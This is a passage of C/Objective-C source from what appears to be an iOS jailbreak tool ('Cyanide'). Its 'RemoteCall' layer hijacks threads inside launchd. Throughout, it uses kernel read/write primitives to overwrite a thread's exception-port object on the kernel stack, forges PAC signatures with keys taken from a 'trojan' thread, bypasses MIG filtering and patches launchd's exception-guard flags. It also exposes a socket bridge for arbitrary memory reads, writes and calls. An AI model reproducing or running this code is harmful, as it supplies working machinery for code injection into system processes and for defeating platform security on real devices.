{
    if (!g_RC_currentState)
        g_RC_currentState = &g_RC_defaultState;
    return g_RC_currentState;
}

static RemoteCallState *remote_call_push_state(RemoteCallState *state)
{
    RemoteCallState *previous = remote_call_current_state();
    g_RC_currentState = state ?: &g_RC_defaultState;
    return previous;
}

static void remote_call_pop_state(RemoteCallState *previous)
{
    g_RC_currentState = previous ?: &g_RC_defaultState;
}

// Round 20: opaque owner token for the cross-session registries (armed
// snapshot / live-arm). The per-session state pointer IS the identity.
static void *rc_current_owner(void)
{
    return (void *)remote_call_current_state();
}

#define g_RC_taskAddr              (remote_call_current_state()->taskAddr)
#define g_RC_creatingExtraThread   (remote_call_current_state()->creatingExtraThread)
#define g_RC_firstExceptionPort    (remote_call_current_state()->firstExceptionPort)
#define g_RC_secondExceptionPort   (remote_call_current_state()->secondExceptionPort)
#define g_RC_firstExceptionPortAddr  (remote_call_current_state()->firstExceptionPortAddr)
#define g_RC_secondExceptionPortAddr (remote_call_current_state()->secondExceptionPortAddr)
#define g_RC_dummyThread           (remote_call_current_state()->dummyThread)
#define g_RC_dummyThreadMach       (remote_call_current_state()->dummyThreadMach)
#define g_RC_dummyThreadAddr       (remote_call_current_state()->dummyThreadAddr)
#define g_RC_dummyThreadTro        (remote_call_current_state()->dummyThreadTro)
#define g_RC_selfThreadAddr        (remote_call_current_state()->selfThreadAddr)
#define g_RC_selfThreadCtid        (remote_call_current_state()->selfThreadCtid)
#define g_RC_originalState         (remote_call_current_state()->originalState)
#define g_RC_vmMap                 (remote_call_current_state()->vmMap)
#define g_RC_callThreadAddr        (remote_call_current_state()->callThreadAddr)
#define g_RC_callThreadPort        (remote_call_current_state()->callThreadPort)
#define g_RC_trojanThreadAddr      (remote_call_current_state()->trojanThreadAddr)
#define g_RC_pid                   (remote_call_current_state()->pid)
#define g_RC_success               (remote_call_current_state()->success)
#define g_RC_threadList            (remote_call_current_state()->threadList)
#define g_RC_trojanMem             (remote_call_current_state()->trojanMem)
#define g_RC_shmemCache            (remote_call_current_state()->shmemCache)
#define g_RC_shmemUseCounter       (remote_call_current_state()->shmemUseCounter)
#define g_RC_shmemClock            (remote_call_current_state()->shmemClock)
#define g_RC_shmemEvictions        (remote_call_current_state()->shmemEvictions)
#define g_RC_firstExceptionTimeoutMS (remote_call_current_state()->firstExceptionTimeoutMS)
#define g_RC_stableExceptionTimeoutFloorMS (remote_call_current_state()->stableExceptionTimeoutFloorMS)
#define g_RC_originalThreadOnly      (remote_call_current_state()->originalThreadOnly)
#define g_RC_vphoneBridge            (remote_call_current_state()->vphoneBridge)
#define g_RC_pacKeyA                 (remote_call_current_state()->pacKeyA)
#define g_RC_pacKeyB                 (remote_call_current_state()->pacKeyB)
#define g_RC_pacKeysCached           (remote_call_current_state()->pacKeysCached)

// Round 17: session PAC-key cache. remote_pac() used to re-read the signing
// keys from g_RC_trojanThreadAddr on EVERY sign — but after session setup that
// thread is restored to launchd duty and can exit at any time. The 12:31:23
// "initproc exited" panic: the source thread died, the key reads zero-filled/
// garbage, every dispatch state was signed wrong, the synthetic thread crashed
// on resume, and the unmodified-state replies kept resuming it into the same
// faulting PC — a crash-loop that filled the second exception port and
// watchdogged launchd. Capture the keys ONCE at init (while the trojan thread
// is provably alive and parked) and sign from the cache for the session's
// life; userspace PAC keys are per-task on arm64e (thread->rop_pid/jop_pid are
// copied from the task at thread creation), so they stay valid for every
// thread of the target for as long as the task lives.
bool rc_session_pac_keys(uint64_t *outA, uint64_t *outB)
{
    if (!g_RC_pacKeysCached) return false;
    if (outA) *outA = g_RC_pacKeyA;
    if (outB) *outB = g_RC_pacKeyB;
    return true;
}

// Round 21 (T3): restore the hijacked task's ORIGINAL task_exc_guard flags.
// disable_excguard_kill() is a TASK-LEVEL mutation of the remote task
// (launchd): it forces TASK_EXC_GUARD_MP_DELIVER so injected guard violations
// reach our ports instead of crashing. If that outlives the session, the next
// real guard violation in launchd tries to DELIVER an exception into ports
// that died with this process — the faulting thread wedges in
// mach_msg_rpc_from_kernel awaiting a reply that never comes (the panic-1/3
// launchd-wedge shape). Call ONLY after every injected thread is un-armed
// (restoring FATAL/CORPSE while a thread still carries our AST_GUARD arming
// would kill the remote task on its next guarded-port touch — the very thing
// disable protects against). One-shot: the saved flag is consumed.
static bool g_RC_taskExcGuardSaved = false;
static uint32_t g_RC_taskExcGuardOrig = 0;

static void rc_restore_task_exc_guard(const char *where)
{
    if (!g_RC_taskExcGuardSaved) return;
    g_RC_taskExcGuardSaved = false;   // consume: never restore twice
    if (!g_RC_taskAddr || !is_kaddr_valid(g_RC_taskAddr)) {
        printf("[RC] task_exc_guard restore skipped (%s): no valid target task\n",
               where);
        return;
    }
    if (!kexploit_krw_ready()) {
        // KRW is gone (the abandon path): nothing left to write the flags back
        // WITH. Name the residual risk so the next panic log can attribute it.
        // Round 25 (B): this is the last link of the initproc-panic chain —
        // launchd keeps EXC_GUARD-DELIVER pointing at our exception ports, so
        // a later guard violation there wedges on dead ports ~22 s after app
        // death. Surface it in the USER log (it survives in the UI / exported
        // log even when the live printf stream is lost with the process).
        printf("[RC] CRITICAL: task_exc_guard restore IMPOSSIBLE (%s): KRW dead — remote "
               "task keeps EXC_GUARD-DELIVER; a future guard violation there "
               "may wedge on our dead ports\n", where);
        log_user("[WARN] task_exc_guard restore failed (%s): KRW dead — launchd "
                 "keeps EXC_GUARD-DELIVER to our dying ports; residual "
                 "initproc-exit risk\n", where);
        return;
    }
    if (restore_excguard_kill(g_RC_taskAddr, g_RC_taskExcGuardOrig) != 0) {
        printf("[RC] task_exc_guard restore FAILED (%s) — residual launchd "
               "wedge risk on future guard violations\n", where);
    }
}

static void remote_call_note_init_failure(RemoteCallInitFailure failure, uint32_t pid)
{
    g_RC_lastInitFailure = failure;
    g_RC_lastInitFailurePid = pid;
    // Round 21 (T3): LocalThread failures happen AFTER the task_exc_guard
    // patch but BEFORE any target thread is armed — the only init-failure
    // class whose exits return without abandon/destroy. Reverting immediately
    // is safe here (nothing injected yet); all later failures restore via the
    // teardown paths, after the un-arm + drain.
    if (failure == RemoteCallInitFailureLocalThread)
        rc_restore_task_exc_guard("init-failure/local-thread");
}

RemoteCallInitFailure remote_call_last_init_failure(void)
{
    return g_RC_lastInitFailure;
}

uint32_t remote_call_last_init_failure_pid(void)
{
    return g_RC_lastInitFailurePid;
}

const char *remote_call_init_failure_description(RemoteCallInitFailure failure)
{
    switch (failure) {
        case RemoteCallInitFailureNone: return "none";
        case RemoteCallInitFailureKRWUnavailable: return "KRW unavailable";
        case RemoteCallInitFailureProcessMissing: return "process not found";
        case RemoteCallInitFailureInvalidTask: return "invalid task";
        case RemoteCallInitFailureExceptionPort: return "exception port setup failed";
        case RemoteCallInitFailureTaskGuard: return "task EXC_GUARD setup failed";
        case RemoteCallInitFailureLocalThread: return "local bootstrap thread setup failed";
        case RemoteCallInitFailureNoTargetThreads: return "no injectable target threads";
        case RemoteCallInitFailureFirstExceptionTimeout: return "target did not deliver bootstrap exception";
        case RemoteCallInitFailureLifecycleGated: return "lifecycle gate closed (app backgrounded/terminating)";
        case RemoteCallInitFailureOther: return "other RemoteCall init failure";
    }
    return "unknown RemoteCall init failure";
}

// Runtime-settable (Settings → debug toggle) with an env-var fallback. -1 means
// "not set by the app yet, consult RC_VERBOSE". Off by default so the guard /
// RC_DEBUG lines don't flood the log after a tweak apply (which fires many
// remote calls).
static _Atomic int g_rc_verbose = -1;

void remote_call_set_verbose(bool on)
{
    atomic_store_explicit(&g_rc_verbose, on ? 1 : 0, memory_order_relaxed);
}

static bool remote_call_verbose_logging(void)
{
    int v = atomic_load_explicit(&g_rc_verbose, memory_order_relaxed);
    if (v >= 0) return v != 0;
    const char *env = getenv("RC_VERBOSE");
    return env && env[0] && strcmp(env, "0") != 0;
}

#define RC_DEBUG(...) do { if (remote_call_verbose_logging()) printf(__VA_ARGS__); } while (0)

static bool remote_call_should_log_result(const char *name, bool stable)
{
    if (remote_call_verbose_logging())
        return true;

    if (!name)
        return true;

    static const char *quietSymbols[] = {
        "malloc",
        "free",
        "objc_msgSend",
        "objc_msgSendSuper",
        "objc_msgSendSuper2",
        "sel_registerName",
        "sel_getUid",
        "objc_getClass",
        "objc_lookUpClass",
        "objc_allocateClassPair",
        "object_getClass",
        "object_getClassName",
        "class_getName",
        "class_getSuperclass",
        "class_getInstanceMethod",
        "class_getClassMethod",
        "class_getInstanceVariable",
        "class_getInstanceSize",
        "class_respondsToSelector",
        "method_getTypeEncoding",
        "method_getName",
        "method_getImplementation",
        "ivar_getOffset",
        "ivar_getName",
        "ivar_getTypeEncoding",
        "strdup",
        "strcmp",
        "strlen",
        "memcpy",
        "memcmp",
        "CFStringCreateWithCString",
        "CFStringCreateWithCStringNoCopy",
        "CFStringGetCStringPtr",
        "CFStringGetLength",
        "CFNumberGetValue",
        "CFRelease",
        "CFRetain",
        "dlopen",
        "dlsym",
        "dladdr",
        "IOServiceMatching",
        "IOServiceGetMatchingService",
        "IORegistryEntryCreateCFProperty",
        "IOObjectRelease",
        "memset",
        "getpid",
        "pthread_create_suspended_np",
        "pthread_mach_thread_np",
        "thread_resume",
        "mmap",
        "sandbox_extension_issue_file",
        "sandbox_extension_issue_file_to_process",
        "sandbox_extension_consume",
    };

    for (size_t i = 0; i < sizeof(quietSymbols) / sizeof(quietSymbols[0]); i++) {
        if (strcmp(name, quietSymbols[i]) == 0)
            return false;
    }

    // Log-once symbols: emit the first invocation so it's visible in the log,
    // then go silent so per-window / per-iteration loops don't flood. CAS
    // means concurrent first-callers never both win.
    static struct { const char *name; volatile int logged; } logOnceTable[] = {
        { "objc_setAssociatedObject", 0 },
        { "objc_getAssociatedObject", 0 },
    };
    for (size_t i = 0; i < sizeof(logOnceTable) / sizeof(logOnceTable[0]); i++) {
        if (strcmp(name, logOnceTable[i].name) == 0) {
            return __sync_bool_compare_and_swap(&logOnceTable[i].logged, 0, 1);
        }
    }

    if (!stable)
        return true;

    return true;
}

#define CY_VPHONE_BRIDGE_MAGIC 0x43595342u
#define CY_VPHONE_BRIDGE_SOCK "/private/var/mobile/Library/Caches/com.zeroxjf.cyanide.vphone-springboard.sock"

typedef struct __attribute__((packed)) {
    uint32_t magic;
    uint32_t op;
    uint64_t addr;
    uint64_t size;
    uint64_t args[8];
    char name[128];
} CYVPhoneBridgeRequest;

typedef struct __attribute__((packed)) {
    uint32_t magic;
    uint32_t status;
    uint64_t result;
    uint64_t extra;
} CYVPhoneBridgeResponse;

static bool rc_read_full_fd(int fd, void *buf, size_t len)
{
    uint8_t *p = (uint8_t *)buf;
    while (len > 0) {
        ssize_t n = read(fd, p, len);
        if (n == 0) return false;
        if (n < 0) {
            if (errno == EINTR) continue;
            return false;
        }
        p += (size_t)n;
        len -= (size_t)n;
    }
    return true;
}

static bool rc_write_full_fd(int fd, const void *buf, size_t len)
{
    const uint8_t *p = (const uint8_t *)buf;
    while (len > 0) {
        ssize_t n = write(fd, p, len);
        if (n < 0) {
            if (errno == EINTR) continue;
            return false;
        }
        if (n == 0) return false;
        p += (size_t)n;
        len -= (size_t)n;
    }
    return true;
}

static int rc_vphone_bridge_connect(void)
{
    int fd = socket(AF_UNIX, SOCK_STREAM, 0);
    if (fd < 0) return -1;

    struct sockaddr_un sun;
    memset(&sun, 0, sizeof(sun));
    sun.sun_family = AF_UNIX;
    strlcpy(sun.sun_path, CY_VPHONE_BRIDGE_SOCK, sizeof(sun.sun_path));
    if (connect(fd, (struct sockaddr *)&sun, sizeof(sun)) != 0) {
        close(fd);
        return -1;
    }
    return fd;
}

static bool rc_vphone_bridge_request(CYVPhoneBridgeRequest *req,
                                     CYVPhoneBridgeResponse *resp,
                                     const void *writeData,
                                     void *readData)
{
    if (!req || !resp) return false;
    req->magic = CY_VPHONE_BRIDGE_MAGIC;

    int fd = rc_vphone_bridge_connect();
    if (fd < 0) {
        printf("[VPHONE-BRIDGE] connect failed errno=%d\n", errno);
        return false;
    }

    bool ok = rc_write_full_fd(fd, req, sizeof(*req));
    if (ok && writeData && req->op == 5 && req->size)
        ok = rc_write_full_fd(fd, writeData, (size_t)req->size);
    if (ok)
        ok = rc_read_full_fd(fd, resp, sizeof(*resp));
    if (ok && resp->magic != CY_VPHONE_BRIDGE_MAGIC)
        ok = false;
    if (ok && readData && req->op == 4 && resp->status == 0 && resp->extra)
        ok = rc_read_full_fd(fd, readData, (size_t)resp->extra);

    close(fd);
    return ok;
}

static bool rc_vphone_bridge_ping(void)
{
    CYVPhoneBridgeRequest req = { .op = 1 };
    CYVPhoneBridgeResponse resp = {0};
    return rc_vphone_bridge_request(&req, &resp, NULL, NULL) &&
           resp.status == 0 && resp.result == 1;
}

static uint64_t rc_vphone_bridge_call(uint32_t op, uint64_t pcAddr, const char *name,
                                      uint64_t x0, uint64_t x1, uint64_t x2, uint64_t x3,
                                      uint64_t x4, uint64_t x5, uint64_t x6, uint64_t x7)
{
    CYVPhoneBridgeRequest req = {0};
    CYVPhoneBridgeResponse resp = {0};
    req.op = op;
    req.addr = pcAddr;
    req.args[0] = x0; req.args[1] = x1; req.args[2] = x2; req.args[3] = x3;
    req.args[4] = x4; req.args[5] = x5; req.args[6] = x6; req.args[7] = x7;
    if (name && name[0])
        strlcpy(req.name, name, sizeof(req.name));

    if (!rc_vphone_bridge_request(&req, &resp, NULL, NULL) || resp.status != 0) {
        printf("[VPHONE-BRIDGE] call failed op=%u name=%s addr=%#llx status=%u\n",
               op, name ?: "(null)", pcAddr, resp.status);
        g_RC_success = false;
        return 0;
    }
    return resp.result;
}

static bool rc_vphone_bridge_unsafe_addr_call_name(const char *name)
{
    if (!name || !name[0]) return false;

    static const char *blocked[] = {
        "IOServiceMatching",
        "IOServiceGetMatchingService",
        "IORegistryEntryCreateCFProperty",
        "IOObjectRelease",
        "SBWorkspaceKillApplication",
    };
    for (size_t i = 0; i < sizeof(blocked) / sizeof(blocked[0]); i++) {
        if (strcmp(name, blocked[i]) == 0) return true;
    }
    return false;
}

static bool rc_vphone_bridge_read(uint64_t src, void *dst, uint64_t size)
{
    if (!dst || size == 0) return true;
    if (size > 0x100000) return false;
    CYVPhoneBridgeRequest req = { .op = 4, .addr = src, .size = size };
    CYVPhoneBridgeResponse resp = {0};
    bool ok = rc_vphone_bridge_request(&req, &resp, NULL, dst) &&
              resp.status == 0 && resp.extra == size;
    if (!ok) g_RC_success = false;
    return ok;
}

static bool rc_vphone_bridge_write(uint64_t dst, const void *src, uint64_t size)
{
    if (!src || size == 0) return true;
    if (size > 0x100000) return false;
    CYVPhoneBridgeRequest req = { .op = 5, .addr = dst, .size = size };
    CYVPhoneBridgeResponse resp = {0};
    bool ok = rc_vphone_bridge_request(&req, &resp, src, NULL) &&
              resp.status == 0;
    if (!ok) g_RC_success = false;
    return ok;
}

static void release_shmem_slot(int i)
{
    if (i < 0 || i >= SHMEM_CACHE_SIZE) return;
    if (g_RC_shmemCache[i].localAddress) {
        mach_vm_deallocate(mach_task_self_,
                           (mach_vm_address_t)g_RC_shmemCache[i].localAddress,
                           PAGE_SIZE);
    }
    if (g_RC_shmemCache[i].port) {
        mach_port_deallocate(mach_task_self_, (mach_port_name_t)g_RC_shmemCache[i].port);
    }
    memset(&g_RC_shmemCache[i], 0, sizeof(g_RC_shmemCache[i]));
    g_RC_shmemUseCounter[i] = 0;
}

static void clear_remote_shmem_cache(void)
{
    for (int i = 0; i < SHMEM_CACHE_SIZE; i++) {
        if (g_RC_shmemCache[i].used) release_shmem_slot(i);
    }
    g_RC_shmemClock = 0;
    g_RC_shmemEvictions = 0;
}

static uint32_t reap_dead_port_names(const char *reason)
{
    mach_port_name_array_t names = NULL;
    mach_port_type_array_t types = NULL;
    mach_msg_type_number_t namesCount = 0;
    mach_msg_type_number_t typesCount = 0;
    kern_return_t kr = mach_port_names(mach_task_self_, &names, &namesCount, &types, &typesCount);
    if (kr != KERN_SUCCESS) return 0;

    mach_msg_type_number_t limit = namesCount < typesCount ? namesCount : typesCount;
    uint32_t dead = 0;
    for (mach_msg_type_number_t i = 0; i < limit; i++) {
        if ((types[i] & MACH_PORT_TYPE_DEAD_NAME) == 0) continue;
        if (mach_port_deallocate(mach_task_self_, names[i]) == KERN_SUCCESS) {
            dead++;
        }
    }

    if (dead && remote_call_verbose_logging()) {
        static volatile uint64_t reapTotal = 0;
        static volatile uint64_t reapEvents = 0;
        uint64_t total = __sync_add_and_fetch(&reapTotal, dead);
        uint64_t events = __sync_add_and_fetch(&reapEvents, 1);
        printf("[RemoteCall] reaped %u ports current=%u cumulative=%llu events=%llu\n",
               dead, namesCount, (unsigned long long)total, (unsigned long long)events);
    }

    if (names) {
        vm_deallocate(mach_task_self_,
                      (vm_address_t)names,
                      (vm_size_t)namesCount * sizeof(mach_port_name_t));
    }
    if (types) {
        vm_deallocate(mach_task_self_,
                      (vm_address_t)types,
                      (vm_size_t)typesCount * sizeof(mach_port_type_t));
    }
    return dead;
}

static void reap_dead_port_names_if_needed(const char *reason)
{
    static volatile uint32_t signCount = 0;
    uint32_t count = __sync_add_and_fetch(&signCount, 1);
    if ((count & 0x3f) != 0) return;
    (void)reap_dead_port_names(reason);
}

// Round 21 (panics 1+3, Cyanide<->runningboardd ABBA): the body below runs an
// actual thread_set_exception_ports TRAP in this process (the suspended helper
// thread's entry point) plus a direct clearing call on the dummy thread — all
// own-process exception-port operations. The public wrapper routes every call
// through the lifecycle gate + process-wide serializer so arming (a) refuses
// to start while the app is backgrounded/terminating — the window where rbd
// policy-sets this task and the trap can deadlock ABBA in the kernel — and
// (b) never overlaps another of our threads inside the trap family. A refusal
// is a clean init/arming failure; every caller unwinds on false.
static bool set_exception_port_on_thread_gated(mach_port_t exceptionPort, uint64_t currThread, bool useMigFilterBypass);
bool set_exception_port_on_thread(mach_port_t exceptionPort, uint64_t currThread, bool useMigFilterBypass) {
    if (!excport_op_begin("thread arm")) {
        printf("[RC] arming thread %#llx refused by lifecycle gate — clean "
               "init/arming failure\n", currThread);
        return false;
    }
    bool ok = set_exception_port_on_thread_gated(exceptionPort, currThread,
                                                 useMigFilterBypass);
    excport_op_end();
    return ok;
}

static bool set_exception_port_on_thread_gated(mach_port_t exceptionPort, uint64_t currThread, bool useMigFilterBypass) {
    bool success = false;

    void* thread_set_exception_ports_addr = dlsym(RTLD_DEFAULT, "thread_set_exception_ports");
    void* pthread_exit_addr = dlsym(RTLD_DEFAULT, "pthread_exit");
    if (!thread_set_exception_ports_addr || !pthread_exit_addr) {
        printf("[%s:%d] missing thread_set_exception_ports/pthread_exit symbols\n",
               __FUNCTION__, __LINE__);
        return false;
    }
    if (!is_kaddr_valid(currThread)) {
        printf("[%s:%d] invalid target thread %#llx\n",
               __FUNCTION__, __LINE__, currThread);
        return false;
    }
    if (!g_RC_dummyThreadMach || !is_kaddr_valid(g_RC_dummyThreadAddr)) {
        printf("[%s:%d] dummy thread unavailable mach=0x%x addr=%#llx\n",
               __FUNCTION__, __LINE__, g_RC_dummyThreadMach, g_RC_dummyThreadAddr);
        return false;
    }

    pthread_t pthread = NULL;
    int createErr = pthread_create_suspended_np(&pthread, NULL,
        (void *(*)(void *))thread_set_exception_ports_addr, NULL);
    if (createErr != 0 || !pthread) {
        printf("[%s:%d] pthread_create_suspended_np failed err=%d thread=%p\n",
               __FUNCTION__, __LINE__, createErr, pthread);
        return false;
    }

    mach_port_t machThread = pthread_mach_thread_np(pthread);
    if (!machThread) {
        printf("[%s:%d] pthread_mach_thread_np returned null for helper thread\n",
               __FUNCTION__, __LINE__);
        pthread_cancel(pthread);
        return false;
    }
    uint64_t machThreadAddr = task_get_ipc_port_kobject(task_self(), machThread);
    if (!is_kaddr_valid(machThreadAddr)) {
        printf("[%s:%d] failed to resolve helper thread kobject mach=0x%x addr=%#llx\n",
               __FUNCTION__, __LINE__, machThread, machThreadAddr);
        pthread_cancel(pthread);
        mach_port_deallocate(mach_task_self_, machThread);
        return false;
    }

    if(useMigFilterBypass) {
        mig_bypass_monitor_threads(g_RC_selfThreadAddr, machThreadAddr);
    }

    arm_thread_state64_internal state;
    memset(&state, 0, sizeof(state));
    mach_msg_type_number_t count = ARM_THREAD_STATE64_COUNT;
    kern_return_t kr = thread_get_state(machThread, ARM_THREAD_STATE64,
                                        (thread_state_t)&state, &count);
    if (kr != KERN_SUCCESS) {
        printf("[%s:%d] thread_get_state failed: 0x%x (%s)\n",
               __FUNCTION__, __LINE__, kr, mach_error_string(kr));
        pthread_cancel(pthread);
        mach_port_deallocate(mach_task_self_, machThread);
        return false;
    }

    uint64_t diver = 0;
    diver = (uint64_t)state.__flags & __DARWIN_ARM_THREAD_STATE64_USER_DIVERSIFIER_MASK;

    arm_thread_state64_set_pc_fptr(state, thread_set_exception_ports_addr);
    arm_thread_state64_set_lr_fptr(state, pthread_exit_addr);

    uint64_t exceptionMask = EXC_MASK_GUARD |
                             EXC_MASK_BAD_ACCESS |
                             EXC_MASK_BAD_INSTRUCTION |
                             EXC_MASK_BREAKPOINT |
                             EXC_MASK_ARITHMETIC;

    state.__x[0] = g_RC_dummyThreadMach;
    state.__x[1] = exceptionMask;
    state.__x[2] = exceptionPort;
    state.__x[3] = EXCEPTION_STATE | MACH_EXCEPTION_CODES;
    state.__x[4] = ARM_THREAD_STATE64;

    if(useMigFilterBypass)
        usleep(100000);

    if (!thread_set_state_wrapper(machThread, machThreadAddr,
                                  (arm_thread_state64_internal *)&state))
    {
        pthread_cancel(pthread);
        mach_port_deallocate(mach_task_self_, machThread);
        return false;
    }

    if(useMigFilterBypass)
        usleep(100000);

    thread_set_mutex(g_RC_dummyThreadAddr, g_RC_selfThreadCtid);

    if (!thread_resume_wrapper(machThread))
    {
        pthread_cancel(pthread);
        mach_port_deallocate(mach_task_self_, machThread);
        return false;
    }

    for (int i = 0; i < 10; i++)
    {
        usleep(200000);

        // Round 30: a backgrounding can land during the tro-dance (184716 —
        // deadlocked rbd in this window). Bail BEFORE the direct clearing
        // call below adds a second in-kernel exception-ports trap; the
        // candidate arm simply fails and the walk's stop checks abort.
        if (remote_call_stop_requested() || excport_gate_blocked()) {
            printf("[RC] arm: stop/gate landed mid tro-dance — aborting this "
                   "candidate's arm (no direct clear)\n");
            break;
        }

        uint64_t kstack = thread_get_kstackptr(machThreadAddr);
        if (!is_kaddr_valid(kstack)) {
            printf("[%s:%d] Failed to get valid kstack (%#llx). Retry...\n",
                   __FUNCTION__, __LINE__, kstack);
            continue;
        }

        uint64_t kernelSP = kread64(kstack + off_arm_kernel_saved_state_sp);
        if (!is_kaddr_valid(kernelSP)) {
            printf("[%s:%d] Failed to get valid SP (%#llx). Retry...\n",
                   __FUNCTION__, __LINE__, kernelSP);
            continue;
        }
        usleep(100);

        uint64_t pageBase = trunc_page(kernelSP) + 0x3000ULL;
        if (!is_kaddr_valid(pageBase)) {
            printf("[%s:%d] invalid helper stack probe page %#llx\n",
                   __FUNCTION__, __LINE__, pageBase);
            continue;
        }
        char dataBuff[0x1000];
        memset(dataBuff, 0, 0x1000);
        kreadbuf(pageBase, &dataBuff, 0x1000);

        uint64_t needleVal = g_RC_dummyThreadTro;
        void *match = memmem(dataBuff, 0x1000, &needleVal, sizeof(needleVal));
        if (!match) {
            printf("[%s:%d] Couldn't find g_RC_dummyThreadTro\n", __FUNCTION__, __LINE__);
            continue;
        }
        size_t foundOffset = (size_t)((uint8_t *)match - (uint8_t *)dataBuff);
        uint64_t found = (uint64_t)foundOffset + 0x3000;
        memset(dataBuff, 0, 0x1000);

        bool correctTro = false;
        uint64_t checkAddr = trunc_page(kernelSP) + found + 0x18ULL;
        uint64_t checkVal  = kread64(checkAddr);

        uint64_t checkAddr2 = trunc_page(kernelSP) + found + 0x10ULL;   // on iPad 7(arm64)/18.3.2, offsets may be different
        uint64_t checkVal2  = kread64(checkAddr2);

        if (checkVal == exceptionMask || checkVal2 == exceptionMask) {
            correctTro = true;
        } else {
            printf("[%s:%d] Wrong tro (%#llx/%#llx != %#llx). Retry...\n",
                   __FUNCTION__, __LINE__, checkVal, checkVal2, exceptionMask);
//            printf("[%s:%d] Wrong tro = 0x%llx (kread64 from 0x%llx, trunc_page(kernelSP) = 0x%llx), Retry...\n", __FUNCTION__, __LINE__, checkVal, checkAddr, trunc_page(kernelSP));
//            khexdump(trunc_page(kernelSP), 0x4000);
//            while(1) {};
            continue;
        }

        if (found && correctTro) {
            if (thread_get_task(currThread) == g_RC_taskAddr) {
                uint64_t tro = thread_get_t_tro(currThread);
                if (!is_kaddr_valid(tro)) {
                    printf("[%s:%d] target thread tro invalid %#llx\n",
                           __FUNCTION__, __LINE__, tro);
                    continue;
                }
                kwrite64(trunc_page(kernelSP) + found, tro);
                success = true;
                break;
            } else {
                // Round 8: the target thread died mid tro-dance (its slot was
                // freed/reused — the owning task no longer matches). It will
                // not come back: stop probing (was 10x 200 ms of pointless
                // retries and 10 "got empty tro" lines per dead slot, live
                // copy.log 21:58:32-33), write NOTHING, and let the walk skip
                // to the next candidate.
                RC_DEBUG("[%s:%d] target thread gone mid tro-dance — aborting "
                         "this thread's arming with no write\n",
                         __FUNCTION__, __LINE__);
                break;
            }
        } else {
            NSLog(@"[%s:%d] didnt find tro for 0x%llx", __FUNCTION__, __LINE__, (uint64_t)currThread);
        }
    }

    thread_set_mutex(g_RC_dummyThreadAddr, 0x40000000);

    // Round 30: skip the direct clearing trap when a stop/gate landed — this
    // exact call (in-kernel, dummy-thread lock held, AMFI taking the task
    // lock) is where 184716 deadlocked against rbd's task_policy_set. The
    // clear is defensive (the dummy never had live ports unless the helper
    // completed pre-swap; the dummy never runs, so a stale retarget on it can
    // never fire) — skipping it is always safer than entering the trap family
    // in the backgrounding window.
    if (!remote_call_stop_requested() && !excport_gate_blocked()) {
        thread_set_exception_ports(g_RC_dummyThreadMach, 0, exceptionPort, EXCEPTION_STATE | MACH_EXCEPTION_CODES, ARM_THREAD_STATE64);
    } else {
        printf("[RC] arm: stop/gate active — skipping dummy-thread direct clear "
               "(defensive only; dummy never runs)\n");
    }

    if(useMigFilterBypass)
        usleep(100000);

    mach_port_deallocate(mach_task_self_, machThread);
    return success;
}

// Signs pc/lr into *state. Returns false when PAC signing failed (remote_pac
// returned -1 — e.g. KRW died mid-call): the caller MUST NOT dispatch the
// thread with this state (a garbage PC inside launchd killed it at 17:50:30,
// live 10.log → "initproc exited" panic). The safe abort is replying with the
// thread's UNMODIFIED trapped state, which re-parks it exactly where it was.
bool sign_state(uint64_t signingThread, arm_thread_state64_internal *state, uint64_t pc, uint64_t lr)
{
    reap_dead_port_names_if_needed("sign_state");

    if(gIsPACSupported) {
        uint64_t diver = 0;
        diver = (uint64_t)state->__flags & __DARWIN_ARM_THREAD_STATE64_USER_DIVERSIFIER_MASK;
        uint64_t discPC = ptrauth_blend_discriminator_wrapper(diver, ptrauth_string_discriminator_special("pc"));
        uint64_t discLR = ptrauth_blend_discriminator_wrapper(diver, ptrauth_string_discriminator_special("lr"));

        if (pc) {
            uint64_t signedPC = remote_pac(signingThread, pc, discPC);
            if (signedPC == (uint64_t)-1 || signedPC == 0) {
                printf("[RC] sign_state: remote_pac(pc) FAILED (KRW lost?) — refusing "
                       "to dispatch thread with a garbage PC\n");
                return false;
            }
            uint32_t flags = state->__flags;
            flags &= ~__DARWIN_ARM_THREAD_STATE64_FLAGS_KERNEL_SIGNED_PC;
            state->__flags = flags;
            state->__pc = signedPC;
        }
        if (lr) {
            uint64_t signedLR = remote_pac(signingThread, lr, discLR);
            if (signedLR == (uint64_t)-1 || signedLR == 0) {
                printf("[RC] sign_state: remote_pac(lr) FAILED (KRW lost?) — refusing "
                       "to dispatch thread with a garbage LR\n");
                return false;
            }
            uint32_t flags = state->__flags;
            flags &= ~(__DARWIN_ARM_THREAD_STATE64_FLAGS_KERNEL_SIGNED_LR |
                       __DARWIN_ARM_THREAD_STATE64_FLAGS_IB_SIGNED_LR);
            state->__flags = flags;
            state->__lr = signedLR;
        }
        return true;
    }

    if(!gIsPACSupported) {
        if (pc) state->__pc = pc;
        if (lr) state->__lr = lr;
    }
    return true;
}

// Round 17: trap classification for the trojan RPC protocol. A HEALTHY
// parked-thread trap is EXC_BAD_ACCESS at one of the four FAKE sentinel
// addresses (RemoteCall.m: the thread faults on PC/LR = 0x101/0x201/0x301/
// 0x401 by design). Anything else is the thread CRASHING (a badly-signed
// dispatch PC — the 12:30:56 shape) — and treating that crash message as a
// protocol trap is what amplified one bad sign into the port-filling
// crash-loop that watchdogged launchd at 12:31:23. Round 18: moved ahead of
// do_remote_call_temp_internal so the original-thread path classifies too.
static bool rc_exc_is_park_trap(const ExceptionMessage *e)
{
    if (!e || e->exception != EXC_BAD_ACCESS) return false;
    uint64_t where = e->codeSecond;
    return where == FAKE_PC_TROJAN_CREATOR || where == FAKE_LR_TROJAN_CREATOR ||
           where == FAKE_PC_TROJAN         || where == FAKE_LR_TROJAN;
}

// Round 20: is a saved thread state's PC one of the protocol sentinels?
// User VAs below 4 GB are never executable (__PAGEZERO), so stripping the
// PAC field (top bits) and comparing against the four sentinels cannot
// collide with a real instruction address. A "saved original state" whose PC
// is a sentinel is NOT an original state — it is another session's park
// state stolen via cross-session traffic (071602: the kill's init consumed
// the pre-warm's parked trojan re-trap as its first trap, then "restored"
// the thread TO 0x3748800000000201 — re-parking it forever). Restoring to a
// sentinel is always refused.
static bool rc_pc_is_sentinel(uint64_t pc)
{
    uint64_t stripped = pc & 0x7fffffffffULL;
    return stripped == FAKE_PC_TROJAN_CREATOR || stripped == FAKE_LR_TROJAN_CREATOR ||
           stripped == FAKE_PC_TROJAN         || stripped == FAKE_LR_TROJAN;
}

// Round 19: the exact guard code this session injects (see init: GUARD_TYPE_
// MACH_PORT / kGUARD_EXC_INVALID_RIGHT / target 0xf503 — the 0xf503 marker is
